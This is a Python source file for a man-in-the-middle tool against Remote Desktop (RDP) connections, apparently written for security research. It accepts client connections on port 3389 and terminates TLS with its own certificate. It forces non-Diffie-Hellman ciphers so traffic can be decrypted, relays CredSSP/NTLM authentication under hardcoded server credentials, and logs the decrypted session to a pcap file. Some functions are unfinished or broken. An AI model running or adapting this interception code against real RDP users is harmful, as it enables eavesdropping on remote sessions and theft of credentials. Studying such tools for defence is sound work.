#!/usr/bin/env python3
#DiabloHorn http://diablohorn.wordpress.com
#Inspired by: https://labs.portcullis.co.uk/blog/ssl-man-in-the-middle-attacks-on-rdp/
#Resources:
#   http://stackoverflow.com/questions/7574092/python-scapy-wrpcap-how-do-you-append-packets-to-a-pcap-file
#   http://efod.se/media/thesis.pdf

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import sys
from scapy.all import *
from socket import *
import ssl
# import thread
import threading
import binascii
import time
import re
import queue

import credssp
import mccp
import parser_v2

# import sslkeylog
# sslkeylog.set_keylog(os.environ.get('SSLKEYLOGFILE'))  # Or directly specify a path
# sslkeylog.set_keylog('/home/rsa-key-20171202-gcp-aws-cloud9/aws-cloud9-root/rdps2rdp/rdps2rdp/SSLKEYLOGFILE.key')  # Or directly specify a path

# the NON_DH_CHIPHERS was generated using: `openssl ciphers | tr : '\n' | grep -v DH | paste -d: -s`
NON_DH_CIPHERS = "RSA-PSK-AES256-GCM-SHA384:RSA-PSK-CHACHA20-POLY1305:AES256-GCM-SHA384:PSK-AES256-GCM-SHA384:PSK-CHACHA20-POLY1305:RSA-PSK-AES128-GCM-SHA256:AES128-GCM-SHA256:PSK-AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:SRP-RSA-AES-256-CBC-SHA:SRP-AES-256-CBC-SHA:RSA-PSK-AES256-CBC-SHA384:RSA-PSK-AES256-CBC-SHA:AES256-SHA:PSK-AES256-CBC-SHA384:PSK-AES256-CBC-SHA:SRP-RSA-AES-128-CBC-SHA:SRP-AES-128-CBC-SHA:RSA-PSK-AES128-CBC-SHA256:RSA-PSK-AES128-CBC-SHA:AES128-SHA:PSK-AES128-CBC-SHA256:PSK-AES128-CBC-SHA"


BUFF_SIZE = 8192
OUTPUTPCAP = "output.pcap"
LISTENCON = ('0.0.0.0', 3389)
# REMOTECON = ('127.0.0.1', 3390)
host_port = '127.0.0.1:3390'
#host_port = '2.tcp.ngrok.io:19173'
REMOTECON = (host_port.split(':')[0], int(host_port.split(':')[1]))

SERVER_USER_NAME = "runneradmin"
SERVER_PASSWORD = "P@ssw0rd!"


def to_hex(b):
    # return ' '.join(x.encode('hex') for x in msg
    return " ".join("{:02x}".format(x) for x in b)


def receivePdu(sock, sockName):
    msg = b''
    
    print("%s receive: waiting" % sockName)
    sock.settimeout(1)
    temp = b''
    try:
        temp = sock.recv(BUFF_SIZE)
        msg += temp
    except IOError as e:
        if (not re.search("Resource temporarily unavailable", str(e))
                and not re.search("The operation did not complete", str(e))):
            print("%s receive: %s" % (sockName, e))
    print("           Msg from %s [len(msg) = %s] : '%s'" % (sockName, len(msg), to_hex(msg)))
    # print("      ->                '%s'" % msg)
    sock.settimeout(None)
    return msg

def sendPdu(sock, sockName, pdu):
    print("Forwarding Msg from %s [len(msg) = %s] : '%s'" % (sockName, len(pdu), to_hex(pdu)))
    # print("      ->                '%s'" % pdu)
    sock.sendall(pdu)
    
        # # the first response PDU from the server is X.224 Connection Confirm
        # # with a payload of [MS-RDPBCGR] RDP_NEG_RSP
        # # byte 16 of the PDU is RDP_NEG_RSP.selectedProtocol and
        # # \x01 = PROTOCOL_SSL
        # if(serverMsg[11] == '\x02' and serverMsg[15] != '\x01'):
        #     serverMsg = list(serverMsg)
        #     serverMsg[15] = '\x01'
        #     serverMsg = "".join(serverMsg)

def passthrough(pduName, sourceSocket, sourceName, destSocket, destName):
        print(pduName)
        pdu = receivePdu(sourceSocket, sourceName)
        sendPdu(destSocket, destName, pdu)

def negotiate_credssp_as_server(sock):
    context = credssp.CredSSPContext(sock.getpeername()[0], None, None, auth_mechanism='ntlm')
    credssp_gen = context.credssp_generator_as_server()#sock)

    # loop through the CredSSP generator to exchange the tokens between the
    # client and the server until either an error occurs or we reached the
    # end of the exchange
    out_token, step_name = next(credssp_gen)
    while True:
        try:
            in_token = receivePdu(sock, "Client")
            credssp.print_ts_request(in_token)
            out_token, step_name = credssp_gen.send(in_token)
            print("CredSSP: %s" % step_name)
            sendPdu(sock, "MitM", out_token)
            credssp.print_ts_request(out_token)
        except StopIteration:
            break
    print("CredSSP: server unkown message")
    sendPdu(sock, "MitM", '\x00\x00\x00\x00')

def negotiate_credssp_as_client(sock, username=None, password=None):
    context = credssp.CredSSPContext(sock.getpeername()[0], username, password, auth_mechanism='ntlm')
    certificate = sock.getpeercert(binary_form=True) # must be from ssl.wrap_socket()
    credssp_gen = context.credssp_generator_as_client(certificate)
    
    # loop through the CredSSP generator to exchange the tokens between the
    # client and the server until either an error occurs or we reached the
    # end of the exchange
    out_token, step_name = next(credssp_gen)
    while True:
        try:
            print("CredSSP: %s" % step_name)
            sendPdu(sock, "MitM", out_token)
            credssp.print_ts_request(out_token)
            in_token = receivePdu(sock, "Server")
            credssp.print_ts_request(in_token)
            out_token, step_name = credssp_gen.send(in_token)
        except StopIteration:
            break

def handler(clientsock,addr):
    try:
        useCredSsp = False
        serversock = socket(AF_INET, SOCK_STREAM)
        serversock.connect(REMOTECON)
        serversock.setblocking(1)
        
        print('RDP: clientConnectionRequest')
        clientConnectionRequestPdu = receivePdu(clientsock, "Client")
        sendPdu(serversock, "Client", clientConnectionRequestPdu) #RDP_NEG_REQ_TLS)
        
        print('RDP: serverConnectionConfirm')
        serverConnectionConfirm = receivePdu(serversock, "Server")
        print(parser_v2.parse(serverConnectionConfirm))
        # print('serverConnectionConfirm[11] = ', serverConnectionConfirm[11])
        # print('serverConnectionConfirm[15] = ', serverConnectionConfirm[15])
        # the first response PDU from the server is X.224 Connection Confirm
        # with a payload of [MS-RDPBCGR] RDP_NEG_RSP
        # byte 11 of the PDU is the PDU type
        # \x02 = RDP_NEG_RSP
        # \x03 = RDP_NEG_FAILURE
        # byte 16 of the PDU is RDP_NEG_RSP.selectedProtocol and
        # \x01 = PROTOCOL_SSL
        if (serverConnectionConfirm[11] == 0x02 and serverConnectionConfirm[15] == 0x01):
            print('Server requested TLS security')
        elif (serverConnectionConfirm[11] == 0x02 
            and (serverConnectionConfirm[15] == 0x03
                or serverConnectionConfirm[15] == 0x08)):
            print('Server requested Hybrid security (CredSSP) with version %s' % str(serverConnectionConfirm[15]).encode('hex'))
            useCredSsp = True
            # serverConnectionConfirm = RDP_NEG_RSP_TLS
        elif (serverConnectionConfirm[11] == 0x03):
            raise ValueError('Server rejected the connection with reason: %s' % str(serverConnectionConfirm[15]).encode('hex'))
        else:
            raise ValueError('Server requested unknown security')
        sendPdu(clientsock, "Server", serverConnectionConfirm)

        print('Intercepting rdp session from %s' % clientsock.getpeername()[0])
        # ssl_ctx = ssl.create_default_context()
        # ssl_ctx.check_hostname = False
        # ssl_ctx.verify_mode = ssl.CERT_NONE
        # sslserversock = ssl_ctx.wrap_socket(serversock)
        sslserversock = ssl.wrap_socket(serversock,ssl_version=ssl.PROTOCOL_TLS)
        sslserversock.do_handshake() #just in case
        serversock = None # avoid accidentally reading the encrypted bytes
        
        sslclientsock = ssl.wrap_socket(clientsock, server_side=True,certfile='cert.pem',keyfile='cert.key',ciphers=NON_DH_CIPHERS)#, ssl_version=ssl.PROTOCOL_TLSv1)
        sslclientsock.do_handshake() #just in case
        clientsock = None # avoid accidentally reading the encrypted bytes
        
        if useCredSsp:
            if False: # pass-through observer mode
                print('CredSSP: clientSpnego - Negotiate')
                clientSpnego = receivePdu(sslclientsock, "Client")
                sendPdu(sslserversock, "Client", clientSpnego)
                credssp.print_ts_request(clientSpnego)
                
                print('CredSSP: serverSpnego - challenge')
                serverSpnego = receivePdu(sslserversock, "Server")
                sendPdu(sslclientsock, "Server", serverSpnego)
                credssp.print_ts_request(serverSpnego)
            
                print('CredSSP: clientPublicKey - authenticate')
                clientPublicKey = receivePdu(sslclientsock, "Client")
                sendPdu(sslserversock, "Client", clientPublicKey)
                credssp.print_ts_request(clientPublicKey)
                
                print('CredSSP: serverPublicKey - ??')
                serverPublicKey = receivePdu(sslserversock, "Server")
                sendPdu(sslclientsock, "Server", serverPublicKey)
                credssp.print_ts_request(serverPublicKey)
                
                # print('CredSSP: clientCredentials - ??')
                # clientCredentials = receivePdu(sslclientsock, "Client")
                # sendPdu(sslserversock, "Client", clientCredentials)
            else:
                print('CredSSP: MitM with Server')
                negotiate_credssp_as_client(sslserversock, username=SERVER_USER_NAME, password=SERVER_PASSWORD)
                print('CredSSP: MitM with Client')
                negotiate_credssp_as_server(sslclientsock)

        # passthrough('RDP: client ConfrenceCreate', sslclientsock, "Client", sslserversock, "Server")
        # passthrough('RDP: server ConfrenceResponse', sslserversock, "Server", sslclientsock, "Client")
        
        to_server, to_client = TcpStream.create_stream_pair(sslserversock,sslclientsock)
        print('Passing traffic through uninterpreted from client to server')
        threading.Thread(target=trafficloop, args=(to_server,True)).start()

        print('Passing traffic through uninterpreted from server to client')
        threading.Thread(target=trafficloop, args=(to_client,True)).start()
        
    except:
        import traceback
        traceback.print_exc()

# problem:
# * single threaded message processing for both connections
# * log all messages received by each connection
# * pass socket to function (credssp/ssl)
# * pause listening on a connection so that the connection control can be transfered
# * get bytes sent on other connection? should be equal to the bytes recieved
# * receive messages from either connection at the same time, and know which connection the message is from
def handler_v2(stream):
    try:
        useCredSsp = False
        
        print('RDP: clientConnectionRequest')
        clientConnectionRequestPdu = stream.receive_pdu_from_client(blocking=True)
        stream.send_pdu_to_server(clientConnectionRequestPdu) #RDP_NEG_REQ_TLS)
        
        print('RDP: serverConnectionConfirm')
        pdu = stream.receive_pdu_from_server(blocking=True)
        if pdu.tpkt.x224.x224_connect.rdpNegReq_header.type == Rdp.Negotiate.RDP_NEG_RSP:
            if pdu.tpkt.x224.x224_connect.rdpNegRsp.selectedProtocol == Rdp.Protocols.PROTOCOL_SSL:
                print('Server requested TLS security')
            elif pdu.tpkt.x224.x224_connect.rdpNegRsp.selectedProtocol in (
                    Rdp.Protocols.PROTOCOL_HYBRID, Rdp.Protocols.PROTOCOL_HYBRID_EX):
                print('Server requested Hybrid security (CredSSP)')
                useCredSsp = True
            else:
                raise ValueError('Server requested unknown security')
        stream.send_pdu_to_client(pdu)
        
        print('Intercepting rdp SSL session from %s' % clientsock.getpeername()[0])
        stream.server = stream.server.clone_wrapper_onto(ssl.wrap_socket(stream.server,ssl_version=ssl.PROTOCOL_TLS))
        stream.server.do_handshake() #just in case
        stream.client = stream.client.clone_wrapper_onto(ssl.wrap_socket(stream.client, server_side=True,certfile='cert.pem',keyfile='cert.key',ciphers=NON_DH_CIPHERS))#, ssl_version=ssl.PROTOCOL_TLSv1)
        stream.client.do_handshake() #just in case
        
        if useCredSsp:
            print('CredSSP: MitM with Server')
            negotiate_credssp_as_client(stream.server, username=SERVER_USER_NAME, password=SERVER_PASSWORD)
            print('CredSSP: MitM with Client')
            negotiate_credssp_as_server(stream.client)

        while True:
            print('Passing traffic through uninterpreted from client to server')
            pdu = stream.receive_pdu_from_client()
            if pdu:
                stream.send_pdu_to_server(pdu)
            pdu = stream.receive_pdu_from_server()
            if pdu:
                stream.send_pdu_to_client(pdu)

    except:
        import traceback
        traceback.print_exc()


class TcpStream(object):
    def __init__(self, source, source_name, destination, destination_name):
        self.source = source
        self.source_name = source_name
        self.destination = destination
        self.destination_name = destination_name
        self.receive_queue = queue.Queue()
        self.bytes_received = 0
        self.bytes_sent = 0
        self.oposite_stream = None
        
        def receive_from(stream):
            try:
                while True:
                    msg = stream.source.receive(BUFF_SIZE)
                    if msg:
                        stream.receive_queue.push(msg)
                        stream.receive_queue.join()
            except:
                import traceback
                traceback.print_exc()
        
        self.receive_thread = threading.Thread(target=receive_from, args=(self,))
        self.receive_thread.start()
        
        
    @staticmethod
    def create_stream_pair(server, client):
        from_server = TcpStream(server, 'Server', client, 'Client')
        from_client = TcpStream(client, 'Client', server, 'Server')
        
        from_server.oposite_stream = from_client
        from_client.oposite_stream = from_server
        
        return (from_client, from_server)
        
    def make_tcp_packet(self, payload):
        return (IP(src=self.source.getpeername()[0], dst=self.destination.getpeername()[0])
                # /TCP(sport=self.source.getpeername()[1], dport=self.destination.getpeername()[1], seq=self.bytes_sent, ack=self.oposite_stream.bytes_sent, flags='PA')
                /TCP(sport=self.source.getpeername()[1], dport=self.destination.getpeername()[1], seq=self.bytes_sent, ack=self.bytes_received, flags='PA')
                /Raw(payload))
    
    def receive(self, buffer_size = BUFF_SIZE):
        print("%s receive: waiting" % self.source_name)
        # sock.settimeout(1)
        # try:
        #     # msg = sock.recv(BUFF_SIZE)
        #     msg = self.source.recv(buffer_size)
        # except IOError as e:
        #     if (not re.search("Resource temporarily unavailable", str(e))
        #             and not re.search("The operation did not complete", str(e))):
        #         print("%s receive: %s" % (self.source_name, e))
        # sock.settimeout(None)
        
        try:
            msg = self.receive_queue.get_nowait()
        except queue.Empty:
            return None
        
        if msg:
            self.bytes_received += len(msg)
        
            pkt = self.make_tcp_packet(msg)
            # s = hexdump(pkt, dump=True)
            wrpcap(OUTPUTPCAP,pkt,append=True)
            
            pdu = parser_v2.parse(msg, rdp_context)
            # print("           Msg from %s [len(msg) = %s] : '%s'" % (self.source_name, len(msg), to_hex(msg)))
            print("           Msg from %s [len(msg) = %s] : %s" % (self.source_name, len(msg), pdu))
            # print("      ->                '%s'" % msg)
        else:
            print('Shutting down rdp session')
            self.source.shutdown(socket.SHUT_RD)
            self.destination.shutdown(socket.SHUT_WR) 
        return pdu
    
    def send(self, msg, is_mitm_msg = False):
        if is_mitm_msg:
            source_name = "MitM"
        else:
            source_name = self.source_name
            self.receive_queue.task_done()
        print("Forwarding Msg from %s [len(msg) = %s] : '%s'" % (source_name, len(msg), to_hex(msg)))
        self.destination.sendall(msg)
        self.bytes_sent += len(msg)

class TcpStream_v2(object):
    def __init__(self, server, client):
        self.server = server
        self.client = client

    def make_tcp_packet(self, source, payload):
        if source is not self.client and source is not self.server:
            raise ValueError('Source is not one of the sockets of the stream')
        elif source is self.client:
            destination = self.server
        else:
            destination = self.client
        return (IP(src=source.getpeername()[0], dst=destination.getpeername()[0])
                # /TCP(sport=source.getpeername()[1], dport=destination.getpeername()[1], seq=self.bytes_sent, ack=self.oposite_stream.bytes_sent, flags='PA')
                /TCP(sport=source.getpeername()[1], dport=destination.getpeername()[1], seq=self.bytes_sent, ack=self.bytes_received, flags='PA')
                /Raw(payload))

    def _receivePdu(self, sock, sockName, blocking=False):
        pdu = None
        
        print("%s receive: waiting" % sockName)
        if blocking:
            orig_timeout = sock.gettimeout()
            sock.settimeout(None)
        try:
            msg = sock.receive_peek(4)
            if msg:
                pdu_length = parser_v2.parse_pdu_length(msg)
                msg = sock.receive_exactly(pdu_length)
                if msg:
                    if False:#do_log:
                        pkt = self.make_tcp_packet(sock, msg)
                        # s = hexdump(pkt, dump=True)
                        wrpcap(OUTPUTPCAP,pkt,append=True)
                    pdu = parser_v2.parse(msg)
        except IOError as e:
            if (not re.search("Resource temporarily unavailable", str(e))
                    and not re.search("The operation did not complete", str(e))):
                print("%s receive: %s" % (sockName, e))
        # print("           Msg from %s [len(msg) = %s] : '%s'" % (sockName, len(msg), to_hex(msg)))
        # print("      ->                '%s'" % msg)
        if blocking:
            sock.settimeout(orig_timeout)
        return pdu
    
    def receive_pdu_from_server(self, blocking=False):
        return self._receivePdu(self.server, 'Server', blocking)

    def receive_pdu_from_client(self, blocking=False):
        return self._receivePdu(self.client, 'Client', blocking)

    def _send_pdu(self, pdu, sock, sock_name, source_name):
        msg = pdu.as_wire_bytes()
        # print("Forwarding Msg from %s to %s [len(msg) = %s] : '%s'" % (source_name, sock_name, len(msg), to_hex(msg)))
        sock.sendall(msg)

    def send_pdu_to_server(self, pdu, is_mitm_msg = False):
        if is_mitm_msg:
            source = "MitM"
        else:
            source = "Client"
        self._send_pdu(pdu, self.server, "Server", source)
        
    def send_pdu_to_client(self, pdu, is_mitm_msg = False):
        if is_mitm_msg:
            source = "MitM"
        else:
            source = "Server"
        self._send_pdu(pdu, self.client, "Client", source)

# class BufferList(object):
#     def __init__(self):
#         self._buffers = []
        
#     def __len__(self):
#         length = 0
#         for buffer in self._buffers:
#             length += len(buffer)
#         return length
    

class SocketWrapper(object):
    def __init__(self, sock, bytes_received=0, bytes_sent=0):
        self.socket = sock
        self.bytes_received = bytes_received
        self.bytes_sent = bytes_sent
        self._receive_buffer = bytes()
        # self._send_buffer = bytes()
        
    def __getattr__(self, name):
        if hasattr(self.socket, name):
            return getattr(self.socket, name)
        else:
            raise AttributeError('Class <%s> does not have a field named: %s' % (self.__class__.__name__, name))

    def clone_wrapper_onto(self, new_socket):
        self.socket = None
        return SocketWrapper(new_socket, bytes_received=self.bytes_received, bytes_sent=self.bytes_sent)

    def receive_peek(self, num_bytes):
        if len(self._receive_buffer) > num_bytes:
            return self._receive_buffer[:num_bytes]
        buffer = self.recv(num_bytes)
        if buffer:
            self._receive_buffer += buffer
            if len(self._receive_buffer) > num_bytes:
                return self._receive_buffer[:num_bytes]
        return bytes()

    def receive_exactly(self, num_bytes):
        if len(self._receive_buffer) > num_bytes:
            result = self._receive_buffer[:num_bytes]
            self._receive_buffer = self._receive_buffer[num_bytes:]
            return result
        buffer = self.recv(num_bytes)
        if buffer:
            self._receive_buffer += buffer
            if len(self._receive_buffer) > num_bytes:
                result = self._receive_buffer[:num_bytes]
                self._receive_buffer = self._receive_buffer[num_bytes:]
                return result
        return bytes()

    def recv(self, bufsize, flags=0):
        return self.recvfrom(bufsize, flags)[0]

    def recvfrom(self, bufsize, flags=0):
        (data, ancdata, msg_flags, address) = self.recvmsg(bufsize, flags=0)
        return (data, address)

    def recvmsg(self, bufsize, ancbufsize=0, flags=0):
        buffer = bytearray(bufsize)
        (nbytes, ancdata, msg_flags, address) = self.recvmsg_into([buffer], ancbufsize, flags)
        return (buffer[:nbytes], ancdata, msg_flags, address)

    def recv_into(self, buffer, nbytes=0, flags=0):
        return self.recvfrom_into(buffer, nbytes, flags)[0]
    
    def recvfrom_into(self, buffer, nbytes=0, flags=0):
        (nbytes, ancdata, msg_flags, address) = self.recvmsg_into([buffer], flags=0)
        return (nbytes, address)

    def recvmsg_into(self, buffers, ancbufsize=0, flags=0):
        (nbytes, ancdata, msg_flags, address) = self.socket.recvmsg_into(buffers, ancbufsize, flags)
        
        self.bytes_received += nbytes
        # bytes_remaining = nbytes
        # offset = 0
        # merged_buffer = bytearray(nbytes)
        # for buffer in buffers:
        #     if bytes_remaining > 0:
        #         buffer_len = len(buffer)
        #         if buffer_len <= bytes_remaining:
        #             bytes_remaining -= buffer_len
        #         else:
        #             buffer = buffer[:bytes_remaining]
        #             buffer_len = bytes_remaining
        #             bytes_remaining = 0
        #         merged_buffer[offset:offset+buffer_len] = buffer
        #         offset += buffer_len
        # if nbytes > 0:
        #     pkt = self.make_tcp_packet(merged_buffer)
        #     # s = hexdump(pkt, dump=True)
        #     wrpcap(OUTPUTPCAP,pkt,append=True)
            
        return (nbytes, ancdata, msg_flags, address)
    
    def send(self, bytes, flags=0):
        # if self._send_buffer:
        #     bytes_sent = self.socket.send(self._send_buffer, flags)
        #     self.bytes_sent += bytes_sent
        #     self._send_buffer = self._send_buffer[bytes_sent:]
        #     if self._send_buffer:
        #         return 0
        bytes_sent = self.socket.send(bytes, flags)
        self.bytes_sent += bytes_sent
        return bytes_sent
    
    def sendall(self, bytes, flags=0):
        # if self._send_buffer:
        #     self.socket.sendall(self._send_buffer, flags)
        #     self.bytes_sent += len(self._send_buffer)
        #     self._send_buffer = bytes()
        self.socket.sendall(bytes, flags)
        self.bytes_sent += len(bytes)
        return None
        
    def sendmsg(self, buffers, ancdata=[], flags=0, address=None):
        # if self._send_buffer:
        #     bytes_sent = self.socket.send(self._send_buffer, flags)
        #     self.bytes_sent += bytes_sent
        #     self._send_buffer = self._send_buffer[bytes_sent:]
        #     if self._send_buffer:
        #         return 0
        bytes_sent = self.socket.sendmsg(buffers, ancdata, flags, address)
        self.bytes_sent += bytes_sent
        return bytes_sent
        
    def sendfile(self, file, offset=0, count=None):
        raise NotImplementedError()
    

def trafficloop(tcpStream,dopcap):
    msg = ' '
    rdp_context = parser_v2.RdpContext()
    try:
        while msg:
            msg = tcpStream.receive(BUFF_SIZE)
            if msg:
                if dopcap:
                    # pkt_list = rdpcap(OUTPUTPCAP)
                    # socket.getpeername()
                    # socket.getsockname()
                    pkt = tcpStream.make_tcp_packet(msg)
                    # s = hexdump(pkt, dump=True)
                    wrpcap(OUTPUTPCAP,pkt,append=True)
                # print("           Msg from %s [len(msg) = %s] : '%s'" % (tcpStream.source.getpeername()[0], len(msg), to_hex(msg)))
                # print("           Msg from %s [len(msg) = %s] : '%s'" % (tcpStream.source.getpeername()[0], len(msg), parser_v2.parse(msg, rdp_context)))
                tcpStream.send(msg)
            else:
                print('Shutting down rdp session')
                tcpStream.source.shutdown(socket.SHUT_RD)
                tcpStream.destination.shutdown(socket.SHUT_WR) 
    except:
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    True
    False

    if False: # MITM
        print('deleting old pcap file: ', OUTPUTPCAP)
        try:
            os.remove(OUTPUTPCAP)
        except FileNotFoundError:
            pass
        
        serversock = socket(AF_INET, SOCK_STREAM)
        serversock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        serversock.bind(LISTENCON)
        serversock.listen(5)
        while 1:
            print('waiting for connection...')
            clientsock, addr = serversock.accept()
            print('...connected from:', addr)
            
            if True: # intercept and decrypte MITM
                handler(clientsock,addr)
                
            if False: # observe only MITM
                destsock = socket(AF_INET, SOCK_STREAM)
                destsock.connect(REMOTECON)
                destsock.setblocking(1)
        
                from_client, from_server = TcpStream.create_stream_pair(destsock,clientsock)
                print('Passing traffic through uninterpreted from client to server')
                threading.Thread(target=trafficloop, args=(from_client,True)).start()
        
                print('Passing traffic through uninterpreted from server to client')
                threading.Thread(target=trafficloop, args=(from_server,True)).start()
                break

    if True: # read/print pcap file
        rdp_context = parser_v2.RdpContext()
        pkt_list = rdpcap(OUTPUTPCAP)
        for pkt in pkt_list:
            print(repr(pkt))
            print(parser_v2.parse(pkt[Raw].load, rdp_context))
                
        
    if False: # connect as client
        serversock = socket(AF_INET, SOCK_STREAM)
        serversock.connect(REMOTECON)
        sendPdu(serversock, "Server", RDP_NEG_REQ_CREDSSP)
        serverConnectionConfirm = receivePdu(serversock, "Server")
        print('Connection Confirm protocol chosen: %s' % str(serverConnectionConfirm[15]).encode('hex'))
        
        # ssl_ctx = ssl.create_default_context()
        # ssl_ctx.check_hostname = False
        # ssl_ctx.verify_mode = ssl.CERT_NONE
        # sslserversock = ssl_ctx.wrap_socket(serversock)
        sslserversock = ssl.wrap_socket(serversock,ssl_version=ssl.PROTOCOL_TLS)
        sslserversock.do_handshake() #just in case
        negotiate_credssp_as_client(sslserversock, username=SERVER_USER_NAME, password=SERVER_PASSWORD)
                
        # serverCapabilitiesPDU = receivePdu(serversock, "Server")
        # sendPdu(serversock, "Server", CredSSP_PDU_1)
        # serverCapabilitiesPDU = receivePdu(serversock, "Server")
    
    if False: # listen as server only for CredSSP, no passthrough
        serversock = socket(AF_INET, SOCK_STREAM)
        serversock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        serversock.bind(LISTENCON)
        serversock.listen(5)
        print('waiting for connection...')
        clientsock, addr = serversock.accept()
        print('...connected from:', addr)
        # handler(clientsock,addr)
        
        print('RDP: clientConnectionRequest')
        clientConnectionRequestPdu = receivePdu(clientsock, "Client")
        print('RDP: serverConnectionConfirm')
        sendPdu(clientsock, "Server", RDP_NEG_RSP_CREDSSP)
        print('Intercepting rdp session from %s' % clientsock.getpeername()[0])
        sslclientsock = ssl.wrap_socket(clientsock, server_side=True,certfile='cert.pem',keyfile='cert.key', ciphers=NON_DH_CIPHERS)#,ssl_version=ssl.PROTOCOL_TLSv1)
        sslclientsock.do_handshake() #just in case
        clientsock = None # avoid accidentally reading the encrypted bytes
        print('ssl connection context: %s' % sslclientsock.context)
        print('ssl connection cipher: %s' % (sslclientsock.cipher(),))
        print('ssl connection context: %s' % dir(sslclientsock.context))
        for k in [attr for attr in dir(sslclientsock.context) if not attr.startswith('__')]:
            # if isinstance(v, property):
            v = getattr(sslclientsock.context, k)
            if callable(v):
                continue
            try:
                print("    %s: %s" % (k, v))
            except:
                pass
            
        print('CredSSP: MitM with Client')
        negotiate_credssp_as_server(sslclientsock)
        print('done CredSSP')
        afterCredssp = receivePdu(sslclientsock, "Client")

    
    if False: # parse static data
        raw_msgs = [
            # clientSpnego_raw, 
            # mitm_pdu_1, 
            # client_pdu1_resp, 
            # mitm_pdu_2,
            SPNEGO_CHALLENGE_WINDC,
            # SPNEGO_CHALLENGE_MITM,
            ]
            
        for req_raw in raw_msgs:
            print_ts_request(req_raw)
        
    if False: # parse flags
        from spnego._kerberos import (
            parse_flags,
        )
        from spnego._ntlm_raw.messages import (
            NegotiateFlags,
        )
        import pprint
        pprint.pprint(parse_flags(3800728117, enum_type=NegotiateFlags))
        
    if False: # play with scapy
        tcp = (IP(src='8.8.8.8', dst='127.0.0.1')
            / TCP(sport=63, dport=63, flags='PA', seq=1, ack=1))
        tcp.display()
        